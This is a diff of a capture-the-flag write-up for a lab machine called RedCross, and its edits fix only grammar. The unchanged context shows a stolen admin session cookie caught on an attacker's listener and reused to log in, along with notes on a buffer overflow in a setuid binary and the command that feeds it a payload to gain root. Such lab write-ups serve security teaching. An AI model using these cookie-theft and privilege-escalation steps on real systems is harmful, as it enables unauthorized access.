@@ -21,8 +21,8 @@ Ncat: Connection from 10.10.10.113:40500.
 GET /test.gif?cookie=PHPSESSID=4dcd7ecnqq39cgj492nk84p2k0;%20LANG=EN_US;%20SINCE=1612024348;%20LIMIT=10;%20DOMAIN=admin HTTP/1.1
 ```
 
-This response contains a session cookie and it tells that it comes from the domain _admin_ that is the subdomain _admin.redcross.htb_
-By replacing the current _PHPSESSID cookie_ with _"4dcd7ecnqq39cgj492nk84p2k0"_, we get logged in and have access the to the admin panel.
+This response contains a session cookie and it tells that it comes from the domain _admin_ that is the subdomain _admin.redcross.htb_.
+By replacing the current _PHPSESSID cookie_ with _"4dcd7ecnqq39cgj492nk84p2k0"_, we get logged in and have access to the admin panel.
 
 ### Exploiting Haraka on admin.redcross.htb
 
@@ -107,12 +107,12 @@ sudo su
 ### Buffer Overflow of iptctl
 
 Instead of the **PostgreSQL** ways, there is a binary in _/opt/iptctl_ with the **SetUID bit** set and vulnerable to **Buffer Overflow**.
-After getting on the web panel and creating a user to SSH into the box, there can be the source code found in _/home/public/src/iptctl.c_.
+After getting on the web panel and creating a user to SSH into the box, the source code of this can be found in _/home/public/src/iptctl.c_.
 
-In the source code it shows that it has an interactive mode when using the _"-i"_ parameter and that is were the vulnerability is.
+In the source code it shows that it has an interactive mode when using the _"-i"_ parameter and that is where the vulnerability is.
 I will copy the binary to my local box to analyze it further.
 
-When it gets too many characters as input, it will result in a **Segmentation Fault** in this mode:
+When it gets too many characters as input in this mode, it will result in a **Segmentation Fault**:
 ```
 ./iptctl -i
 
@@ -207,4 +207,4 @@ Executing _iptctl_ with the payload:
 (cat /dev/shm/payload.txt; cat) | ./iptctl -i
 ```
 
-There will be no output, but commands work and `id` shows that we became root!
+There will be no output, but system commands work and `id` shows that we became root!
